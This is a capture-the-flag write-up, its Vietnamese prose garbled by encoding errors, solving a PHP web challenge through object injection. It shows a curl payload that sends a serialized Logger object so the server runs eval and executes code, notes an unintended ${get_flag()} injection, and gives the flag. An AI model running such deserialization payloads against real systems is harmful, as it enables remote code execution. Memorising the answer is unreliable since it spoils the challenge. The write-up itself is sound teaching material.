## Fortnight challenge 2022: OOPs (Object oriented programming - supreme)

![warmup category](https://img.shields.io/badge/Category-web-brightgreen.svg)  
![score](https://img.shields.io/badge/Score_after_CTF-200-blue.svg)  
![author](https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg)  
![solves](https://img.shields.io/badge/Solves-25-lightgrey.svg)

### Description
Have you ever heard of OOP? Making the code works is one thing, making it maintainable is another thing lol. Just look at my perfectly-designed-OOP code and learn.

### Hints
- none

### Attached files
[index.php](https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Web%20exploitation/OOPS/index.php)

### Summary
> Giá»›i thiá»‡u vá» **object injection in php**

### Detailed solution
NhÃ¬n sÆ¡ qua thÃ¬ trang web nÃ y Ä‘Ã£ setup khÃ¡ cá»“ng ká»nh chá»‰ Ä‘á»ƒ lÃ m 1 viá»‡c lÃ  in ra nhá»¯ng gÃ¬ mÃ  mÃ¬nh Ä‘Ã£ nháº­p vÃ o. CÃ¡ch hoáº¡t Ä‘á»™ng sáº½ diá»…n ra nhÆ° sau:
1. NgÆ°á»i dÃ¹ng nháº­p ná»™i dung vÃ o `input`, hÃ m `handleSend` sáº½ táº¡o ra 1 `serialized` object vÃ  base64 encode, sau Ä‘Ã³ reload láº¡i trang web kÃ¨m vá»›i param `?msg=<encoded>`
2. Trang web nháº­n param `msg` vÃ  giáº£i mÃ£ thÃ nh 1 object, sau Ä‘Ã³ láº¥y ná»™i dung cá»§a `msg["content"]` vÃ  táº¡o 1 object `Logger`, khá»Ÿi táº¡o attribute `$command = 'echo ("' . $message . '");'`
3. Class `Logger` Ä‘Æ°á»£c khai bÃ¡o hÃ m `_destruct`, luÃ´n Ä‘Æ°á»£c gá»i khi object bá»‹ deallocate, bÃªn trong hÃ m `_destruct` sáº½ gá»i `eval($this->command)`.
4. Náº¿u quÃ¡ trÃ¬nh deserialize cÃ³ váº¥n Ä‘á», 1 object `Logger` khÃ¡c sáº½ Ä‘Æ°á»£c gá»i Ä‘á»ƒ in ra "Oops, something happened".
5. Khi Ä‘oáº¡n code cháº¡y hoÃ n táº¥t, object `Logger` Ä‘Æ°á»£c khá»Ÿi táº¡o sáº½ bá»‹ deallocate, gá»i hÃ m `_destruct` vÃ  in ra input mÃ  báº¡n Ä‘Ã£ nháº­p.

Váº¥n Ä‘á» á»Ÿ quÃ¡ trÃ¬nh nÃ y Ä‘Ã³ lÃ  thay vÃ¬ nháº­n string `input`, trang web láº¡i nháº­n vá» 1 serialized object *cÃ³ váº» nhÆ°* lÃ  má»™t object chá»©a `content` lÃ  input cá»§a ngÆ°á»i dÃ¹ng. CÃ¡ch lÃ m nÃ y má»Ÿ ra má»™t phÆ°Æ¡ng phÃ¡p exploit gá»i lÃ  `object injection`.

Bá»Ÿi vÃ¬ hÃ m `unserialize` cÃ³ thá»ƒ giá»¯ nguyÃªn cáº¥u trÃºc cá»§a 1 object tÆ°Æ¡ng á»©ng vá»›i 1 class nÃ o Ä‘Ã³, chÃºng ta cÃ³ thá»ƒ truyá»n má»™t serialized object cá»§a class `Logger`. VÃ  vÃ¬ attribute cá»§a class nÃ y lÃ  1 cÃ¢u lá»‡nh Ä‘á»ƒ gá»i trong hÃ m `eval`, chÃºng ta cÅ©ng hoÃ n toÃ n cÃ³ thá»ƒ kiá»ƒm soÃ¡t nhá»¯ng gÃ¬ xáº£y ra trong hÃ m nÃ y, dáº«n tá»›i lá»—i RCE. 

Váº­y nÃªn phÆ°Æ¡ng phÃ¡p Ä‘á»ƒ giáº£i challenge nÃ y Ä‘Ã³ lÃ  khai bÃ¡o class `Logger` giá»‘ng nhÆ° trÃªn web, táº¡o 1 object tÆ°Æ¡ng á»©ng vÃ  lÆ°u giÃ¡ trá»‹ `$command` cá»§a nÃ³ thÃ nh `get_flag();`, `serialize` vÃ  `base64_encode` Ä‘á»ƒ gá»­i cho server. Tuy nhiÃªn, vÃ¬ code Ä‘Ã£ máº·c Ä‘á»‹nh coi serialized object lÃ  `Array`, váº­y nÃªn, object cáº§n gá»­i sáº½ pháº£i lÃ  1 array cÃ³ chá»©a object `Logger`.

```bash
> curl "http://103.245.249.107:35001/?msg=$(echo 'a:1:{i:0;O:6:"Logger":1:{s:7:"command";s:11:"get_flag();";}}' | base64 --wrap=0)"

<html>
  <head>
    <title>Object oriented programming - supreme</title>
    <link rel="stylesheet" href="static/style.css">
  </head>

  <body>
    <h1>Message echo-er</h1>
    <h3>Repeats the messages you want to send to yourself.</h3>
    <div class="container">
      <div id="form" class="content">
        <h2>Send your messages here:</h2>
        <input id="message" type="text" placeholder="your message">
        <button onclick="handleSend()">
          Send!
        </button>
      </div>
      <div class="message">
        <h2>Your message</h2>
              </div>
    </div>

    <script>
      function handleSend() {
        const elem = document.getElementById("message");
        const message = elem.value;
        serialized_obj = `a:1:{s:7:"content";s:${message.length}:"${message}";}`;

        console.log(serialized_obj, btoa(serialized_obj));

        document.location = document.location.origin + "?msg=" + btoa(serialized_obj);
      }
    </script>
  </body>
</html>You sent the message: f0rtn1ght{a5_l0ng_As_1t_w0rk5}
```

### Note
VÃ¬ ngÆ°á»i ra Ä‘á» nÃ y váº«n cÃ²n non tay nÃªn Ä‘Ã£ khÃ´ng restrict kÄ© hÆ¡n, cho phÃ©p má»i ngÆ°á»i tÃ¹y Ã½ RCE challenge nÃ y, váº­y nÃªn mÃ¬nh ráº¥t cáº£m Æ¡n cÃ¡c báº¡n tham gia Ä‘Ã£ khÃ´ng lÃ m sáº­p trang web ğŸ™

NgoÃ i ra, viá»‡c ghÃ©p `'echo ("' . $message . '");'` nhÆ° tháº¿ nÃ y cÅ©ng cho phÃ©p RCE mÃ  khÃ´ng cáº§n object injection vÃ¬ báº¡n váº«n cÃ³ thá»ƒ gá»i báº¥t cá»© hÃ m nÃ o báº±ng cÃ¡ch sá»­ dá»¥ng tÃ­nh nÄƒng [string parsing](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing) cá»§a php. NÃªn uninteded sol cá»§a bÃ i lÃ  chá»‰ cáº§n nháº­p `${get_flag()}` lÃ  báº¡n váº«n cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c flag.

Mong cÃ¡c báº¡n thá»© lá»—i

### Flag
```
f0rtn1ght{a5_l0ng_As_1t_w0rk5}
```
